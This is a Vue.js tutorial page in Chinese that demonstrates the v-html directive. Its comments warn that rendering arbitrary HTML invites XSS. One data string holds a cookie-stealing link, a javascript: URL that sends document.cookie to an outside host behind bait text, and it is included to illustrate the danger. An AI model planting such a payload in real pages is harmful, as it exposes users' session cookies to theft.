<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-html指令：
				1.作用：向指定節點渲染包含html結構的内容。
				2.與插值語法的區別：
					(1).v-html會替換店節點中原本的内容，{{xx}}則不會。
					(2).v-html可以解析html的結構。
				3.需特別注意：v-html存有安全性問題！！！！
					(1).在網站上動態渲染任意HTML是非常危险的，容易導致XSS攻擊。
					(2).一定要在可信任的内容上才可以用v-html，不然永遠不要在用户提交的内容上使用！
		-->

		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>立即點開，即可滿足你的一切！</a>',
			}
		})
	</script>
</html>
